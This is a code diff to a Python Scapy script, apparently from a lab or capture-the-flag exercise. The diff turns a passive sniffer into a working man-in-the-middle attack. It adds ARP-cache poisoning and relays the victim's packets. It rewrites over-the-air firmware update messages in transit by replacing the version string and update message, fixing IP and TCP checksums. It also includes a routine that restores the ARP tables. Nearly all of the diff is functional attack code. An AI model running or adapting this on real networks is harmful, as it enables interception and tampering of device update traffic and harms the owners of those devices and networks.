@@ -34,19 +34,57 @@ def findMacAddr():
 
 def poison(sIp, tIp, sMac):
     arppkt = Ether(dst = sMac, src = MyMac)/ARP(op=ARP.is_at, hwsrc=MyMac, psrc=tIp, hwdst=sMac, pdst=sIp)
-    sendp(arppkt)
+    sendp(arppkt, iface=InterFace)
+
+def poison_bidirect(sIp, tIp, sMac, tMac):
+    poison(sIp, tIp, sMac)
+    poison(tIp, sIp, tMac)
+
+def chk_pkt(pkt):
+    if pkt[Ether].src != SenderMac:
+        return 0
+    if pkt[Ether].type == 0x800:
+        if pkt[IP].dst == MyIp:
+            return 0
+    return 1
+
+def repair(sIp, tIp, sMac, tMac):
+    print "repair"
+    arppkt = Ether(dst = sMac, src = MyMac)/ARP(op=ARP.is_at, hwsrc=tMac, psrc=tIp, hwdst=sMac, pdst=sIp)
+    sendp(arppkt, iface=InterFace)
+
 
 def cb(pkt):
-    if "OTA" in str(pkt):
-        print "##################################################"
-        print "OTA!!!"
-        print str(pkt)
-        print "##################################################"
+    flag = chk_pkt(pkt)
+    if flag == 1:       # relay
+        new_pkt = pkt
+        new_pkt[Ether].dst = TargetMac
+        new_pkt[Ether].src = MyMac
+        if "OTA" in str(pkt):
+            #pkt.show2()
+            befLen = len(pkt)
+            new_pkt[Raw].load = new_pkt[Raw].load.replace("Version=\'UFI22\'", "Version=\'UFI33\'")
+            new_pkt[Raw].load = new_pkt[Raw].load.replace("UpdateMessage=\'.\'", "UpdateMessage=\'PizzaSch001\'")
+            del new_pkt[IP].chksum
+            new_pkt[IP].len += len(new_pkt) - befLen
+            del new_pkt[TCP].chksum
+            repair(SenderIp, TargetIp, SenderMac, TargetMac)
+            new_pkt.show2()
+            sendp(new_pkt, iface=InterFace)
+            sys.exit(0)
+        sendp(new_pkt, iface=InterFace)
+        poison(SenderIp, TargetIp, SenderMac)
+    elif flag == 2:     # poison
+        poison(SenderIp, TargetIp, SenderMac)
+
 
 
 findMacAddr()
 
+repair(SenderIp, TargetIp, SenderMac, TargetMac)
 raw_input(">")
+#poison_bidirect(SenderIp, TargetIp, SenderMac, TargetMac)
 poison(SenderIp, TargetIp, SenderMac)
-
+#raw_input(">")
+#repair(SenderIp, TargetIp, SenderMac, TargetMac)
 sniff(iface=InterFace, prn=cb)
